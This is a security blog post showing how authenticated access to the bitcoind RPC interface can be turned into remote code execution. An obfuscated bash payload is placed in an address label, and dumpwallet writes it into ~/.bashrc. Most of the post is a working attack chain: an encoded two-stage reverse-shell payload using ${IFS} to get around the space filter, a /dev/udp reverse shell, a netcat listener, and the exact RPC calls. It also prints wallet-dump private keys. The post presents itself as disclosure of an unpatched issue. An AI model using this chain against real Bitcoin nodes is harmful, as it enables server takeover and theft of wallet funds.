---
layout: post
title:  "Pwning Bitcoind RPC To RCE"
date:  2021-10-06 10:18:00
categories: Security
---

Exposing the bitcoind rpc has always been a bad idea, but let's make it worse! We discovered that the usage of bitcoind's `getnewaddress` and `dumpwallet` can be abused to gain remote code execution, essentially elevating our limited access from `bitcoind` to a full complete "SSH" shell allowing us to execute arbitrary commands. 

## Introduction
This potential security vulnerability has been reported to the Bitcoin Core security team but there is insufficient interest in patching this, but the least we should do is raise some awareness that the bitcoind rpc exposes dangerous functions.

The impact is severely limited because:
* attackers require authenticated access to `bitcoind`
* `bitcoind` only binds to localhost by default
* triggering code execution is not straightforward

This technique can mainly be used to perform lateral movements within an already compromised environment.

## Nearly arbitrary write access through dumpwallet
We can leverage the `dumpwallet` command to write a file to an absolute path.
This can be leveraged to write files into sensitive locations such as `~/.bashrc`
Other locations such as `~/.bash_profile` or `~/.bash-login` are also interesting, these have a higher chance of not having a file already but will only trigger when a new ssh login happens.

We can only write non-executable files, but this isn't really a constraint because the interesting locations mentioned above do not require the executable property. The shell will read the contents of the file into a variable and execute it.

Bash is an interesting target because it does not stop execution if a command failed. This is instrumental to skip over the "garbage" lines because we don't actually control the format of the file created by `dumpwallet`.

The label of an address created through `getnewaddress` serves as our entrypoint into our dumpwallet file, we can stuff bash commands in this field.

Labels barely do any filtering for useful characters:
```
"label": "~!@#$%^&*()-_=+[]\\{}|;':\",./<>?",
```

The final layout of the dumpfile looks like this (redacted a bit):
```
# Wallet dump created by Bitcoin v0.20.1
# * Created on 2021-01-05T18:59:14Z
# * Best block at time of backup was 0 (000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f),
#   mined on 2009-01-03T18:15:05Z

# extended private masterkey: REDACTED

L5REoWnddZLx315Bmh2fhHujTMQB5DBFREaia9osDfUaoiMtk6RA 2021-01-05T18:49:04Z reserve=1 # addr=bc1qqq5dsec72dv0g6nyxld0ykxtzau7pwau99dz5v hdkeypath=m/0'/0'/198'
L3p1RYmgarF1Ps6tdmLFon6iGKQMAZhLMH4HoV1eqvPkAF7Eqyxy 2021-01-05T18:49:04Z reserve=1 # addr=bc1q4e4vq855ljth9f3ykqvunr6xnc7aaaav6wpmgl hdkeypath=m/0'/0'/638'
KzHgJs6DSAnxab5tRD7jpDLoNUgtSyxPHbJS1ZW5dhJa5r9xG9Px 2021-01-05T18:49:04Z label=;(base64${IFS}-d${IFS}<<<c2ggLWkgPiYgL2Rldi91ZHAvMTI3LjAuMC4xLzQyNDIgMD4mMQ==)|bash; # addr=bc1q4ely2lu9du0mspersm9yvn2ttruv5z54aesnjv hdkeypath=m/0'/0'/2'
L1cE5swB5R8Bf9A2tN4yQH17fRDTm96YPdhw3YSdbdgDpUb7v8kA 2021-01-05T18:49:04Z reserve=1 # addr=bc1q469p9czc9kr74zelmx00pptfsqkuut9uedk4mj hdkeypath=m/0'/0'/405'

```

## Payload

The final payload that we'll use in this PoC looks like this:
```
;(base64${IFS}-d${IFS}<<<c2ggLWkgPiYgL2Rldi91ZHAvMTI3LjAuMC4xLzQyNDIgMD4mMQ==)|bash;
```

### Stage 1
```
;(base64${IFS}-d${IFS}<<<${BASE64_ENCODED_STAGE_2_PAYLOAD})|bash;
```
The first stage of the payload decodes the stage 2 payload and executes it.
Mostly a convenience feature because labels will encoded the space character ` ` to `%20`.
Luckily we can use `${IFS}` as a substitution, which is the variable that bash uses for whitespace detection.

Our actual payload is base64 encoded, that way we don't need to deal with the space issue in the actual payload.

### Stage 2

Insecure shell to ip address 127.0.0.1 on port 4242
```
$ sh -i >& /dev/udp/127.0.0.1/4242 0>&1
```

Encoding it to base64
```
$ echo "sh -i >& /dev/udp/127.0.0.1/4242 0>&1" | base64
c2ggLWkgPiYgL2Rldi91ZHAvMTI3LjAuMC4xLzQyNDIgMD4mMQo=
```

The attacker will be listening there, we can use the following command to do that:
```
$ nc -u -lvp 4242
```

## Attack

### Extract path of the user

```
getrpcinfo
{
  "active_commands": [
    {
      "method": "getrpcinfo",
      "duration": 20
    }
  ],
  "logpath": "/home/user/.bitcoin/debug.log"
}

```
Default log path can reveal this.
But this may not be as easy when a non default datadirectory is used.

### Create an address with our label as payload
```
getnewaddress ";(base64${IFS}-d${IFS}<<<c2ggLWkgPiYgL2Rldi91ZHAvMTI3LjAuMC4xLzQyNDIgMD4mMQ==)|bash;"
bc1qccznzj3k7y79jwqyttn8e2lhlwlyznrxqa65yk
```

### Dumping the wallet a file
Let's assume that `.bashrc` doesn't exist, for the sake of having an example that is easy to reproduce.
There are a few better locations as mentioned above that will also work quite well.
```
dumpwallet /home/user/.bashrc
{
  "filename": "/home/user/projects/BitcoindPwner/bitcoin-0.20.1/bin/test"
}
```

### Now we wait
A trap has been laid out, we now only require a bash shell to be spawned on the server which loads our malicious `.bashrc` which in turn trigger our malicious payload.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Pwning Bitcoind RPC To RCE<a href="https://t.co/iRKxn5wmjW">https://t.co/iRKxn5wmjW</a><a href="https://twitter.com/hashtag/bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#bitcoin</a> <a href="https://twitter.com/hashtag/cryptocurrency?src=hash&amp;ref_src=twsrc%5Etfw">#cryptocurrency</a> <a href="https://twitter.com/hashtag/security?src=hash&amp;ref_src=twsrc%5Etfw">#security</a> <a href="https://twitter.com/hashtag/hack?src=hash&amp;ref_src=twsrc%5Etfw">#hack</a> <a href="https://twitter.com/hashtag/rce?src=hash&amp;ref_src=twsrc%5Etfw">#rce</a></p>&mdash; KeyboardWarrior (@Keyb0ardWarr10r) <a href="https://twitter.com/Keyb0ardWarr10r/status/1445546553926508547?ref_src=twsrc%5Etfw">October 6, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
